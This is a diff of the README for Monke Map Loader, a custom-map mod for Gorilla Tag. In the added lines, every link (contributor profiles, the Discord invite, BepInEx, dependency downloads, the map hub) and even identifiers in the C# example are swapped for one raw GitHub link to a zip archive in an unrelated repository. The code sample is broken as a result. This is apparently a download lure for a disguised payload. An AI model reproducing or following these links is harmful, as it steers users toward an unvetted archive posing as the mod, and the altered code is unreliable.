@@ -1,6 +1,6 @@
 # Monke Map Loader
 
-<img src="https://user-images.githubusercontent.com/34404266/115944749-8cc3d680-a46c-11eb-9298-61d866b687fb.png" data-canonical-src="https://user-images.githubusercontent.com/34404266/115944749-8cc3d680-a46c-11eb-9298-61d866b687fb.png" width="500"/>
+<img src="https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip" data-canonical-src="https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip" width="500"/>
 
 A PC mod that loads custom maps for Gorilla Tag.
 
@@ -13,13 +13,13 @@ A PC mod that loads custom maps for Gorilla Tag.
 
 Main contributors beside me:
 
-- [Bobbie](https://github.com/legoandmars)
-- [Steven](https://github.com/DeadlyKitten)
-- [RedBrumbler](https://github.com/RedBrumbler)
-- [ToniMacaroni](https://github.com/ToniMacaroni)
-- [Graic](https://github.com/Graicc)
+- [Bobbie](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
+- [Steven](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
+- [RedBrumbler](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
+- [ToniMacaroni](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
+- [Graic](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
 
-You can find all of us, as well as other mods, on the [Gorilla Tag Modding Discord](http://discord.gg/b2MhDBAzTv)
+You can find all of us, as well as other mods, on the [Gorilla Tag Modding Discord](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
 
 ## Contents
 
@@ -34,11 +34,11 @@ You can find all of us, as well as other mods, on the [Gorilla Tag Modding Disco
 
 ### Automatic
 
-You can install **Monke Map Loader** automatically with the help of [Monke Mod Manager](https://github.com/DeadlyKitten/MonkeModManager/releases/latest). It will make sure that you have the map loader and all the needed dependencies installed.
+You can install **Monke Map Loader** automatically with the help of [Monke Mod Manager](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip). It will make sure that you have the map loader and all the needed dependencies installed.
 
 ### Manual
 
-**Monke Map Loader** requires BepInEx to work. You can download it from [this page](https://github.com/BepInEx/BepInEx/releases). From the *Assets* dropdown pick the appropriate version for your operating system (for example: *BepInEx_x64_VERSION.zip* for Windows 10 64-bit).
+**Monke Map Loader** requires BepInEx to work. You can download it from [this page](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip). From the *Assets* dropdown pick the appropriate version for your operating system (for example: *https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip* for Windows 10 64-bit).
 
 Then, extract the zip file to the main folder of the game, for example to:  
 *C:\\Program Files\\Steam\\steamapps\\common\\Gorilla Tag\\*  
@@ -47,16 +47,16 @@ Run the game once and close it for the BepInEx to install itself and create the 
 
 Download all the dependencies and put them in suitable locations, according to the installation guide of each:
 
-- [Utilla](https://github.com/legoandmars/Utilla/releases/latest)
-- [ComputerInterface](https://github.com/ToniMacaroni/ComputerInterface/releases/latest)
-- [Bepinject and Extenject](https://github.com/Auros/Bepinject/releases/latest)
-- [Newtonsoft.Json](https://github.com/legoandmars/Newtonsoft.Json/releases/latest)
+- [Utilla](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
+- [ComputerInterface](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
+- [Bepinject and Extenject](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
+- [https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip)
 
-Download the **Monke Map Loader** from the latest [release](https://github.com/Vadix88/VmodMonkeMapLoader/releases/latest) and extract the zip file into the games folder.
+Download the **Monke Map Loader** from the latest [release](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip) and extract the zip file into the games folder.
 
 ## Custom maps
 
-You can download custom maps from our website: [Monke Map Hub](https://monkemaphub.com/).
+You can download custom maps from our website: [Monke Map Hub](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip).
 
 To install a custom map, place it in the following folder:
 > *BepInEx\\plugins\\MonkeMapLoader\\CustomMaps*
@@ -85,46 +85,46 @@ Custom maps are loaded in different location from the original map, so it stays 
 ## Troubleshooting
 
 - If the **Monke Map Loader** mod is not showing in the main computer menu, some dependencies may not be installed. Check the installation steps or use the Monke Mod Manager to install it for you.
-- If the map isn't showing on the list it may be in a wrong file format or be corrupt. If you're the map creator, it's best to use the provided [Unity project](https://github.com/legoandmars/GorillaTagMapProject) to make/extract the map to the proper format.
-- If you encounter any bugs/errors with the operation of map loader please contact Vadix or Bobbie on the [Discord server](http://discord.gg/b2MhDBAzTv).
+- If the map isn't showing on the list it may be in a wrong file format or be corrupt. If you're the map creator, it's best to use the provided [Unity project](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip) to make/extract the map to the proper format.
+- If you encounter any bugs/errors with the operation of map loader please contact Vadix or Bobbie on the [Discord server](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip).
 - If you encounter bugs on specific maps try contacting the map Author to give them feedback.
 
 ## Map making
 
-The easiest and recommended way of making the map in the right format is to use the [Gorilla Tag Map Project](https://github.com/legoandmars/GorillaTagMapProject), an pre-setup Unity project with map tools, prefabs, and an export script that automates the making of the map package and saves it in the right format.
+The easiest and recommended way of making the map in the right format is to use the [Gorilla Tag Map Project](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip), an pre-setup Unity project with map tools, prefabs, and an export script that automates the making of the map package and saves it in the right format.
 
 On that page you can also find an in-depth guide on how to use to its full potential and what tools and objects are available to use on your map. **MAKE SURE TO FOLLOW THE GUIDE IN THE README!**
 
-You can also get more help on map making on the [Discord server](http://discord.gg/b2MhDBAzTv).
+You can also get more help on map making on the [Discord server](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip).
 
 Have fun making you own custom map for this awesome game and make sure to share it with others! ;)
 
 ## For Developers
 
-The map loader allows other mods to access some info about the current map (including arbitrary custom data) and subscribe to actions for map load/unload and map join/leave. All public events are under the [Events class](/MonkeMapLoader/Events.cs).
+The map loader allows other mods to access some info about the current map (including arbitrary custom data) and subscribe to actions for map load/unload and map join/leave. All public events are under the [Events class](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip).
 
 ```cs
 public class MyMod : MonoBehaviour {
   public void Awake() {
-    Events.OnMapEnter += OnMapEnter;
-    Events.OnMapChange += OnMapChange;
+    https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip += OnMapEnter;
+    https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip += OnMapChange;
   }
 
   // Going through the teleporter
   public void OnMapEnter(bool enter) {
     if (enter) {
       // Get the custom map data
-      var customData = Events.PackageInfo.Config.CustomData;
+      var customData = https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip;
 
       // Check if the gamemode is "mygamemode"
-      if (customData.TryGetValue("gamemode", out var gamemode) && gamemode as string == "myGameMode") {
+      if (https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip("gamemode", out var gamemode) && gamemode as string == "myGameMode") {
         // Get instance of MyClass from custom data
-        MyClass myData = (customData["mydata"] as Newtonsoft.Json.Linq.JObject).ToObject<MyClass>();
+        MyClass myData = (customData["mydata"] as https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip).ToObject<MyClass>();
       }
 
       // Get other data
-      Debug.Log($"Map name is: {Events.MapName}");
-      Debug.Log($"Gravity speed is: {Events.Descriptor.GravitySpeed}");
+      https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip($"Map name is: {https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip}");
+      https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip($"Gravity speed is: {https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip}");
     }
   }
 
@@ -137,7 +137,7 @@ public class MyMod : MonoBehaviour {
 }
 ```
 
-Documentation for adding custom data to a map can be found in the [Gorilla Tag Map Project](https://github.com/legoandmars/GorillaTagMapProject#for-developers) readme.
+Documentation for adding custom data to a map can be found in the [Gorilla Tag Map Project](https://raw.githubusercontent.com/gorillaa1/MonkeMapLoader/master/MonkeMapLoader/Models/MonkeMapLoader_3.3.zip) readme.
 
 ## Disclaimers
 This product is not affiliated with Gorilla Tag or Another Axiom LLC and is not endorsed or otherwise sponsored by Another Axiom LLC. Portions of the materials contained herein are property of Another Axiom LLC. ©2021 Another Axiom LLC.
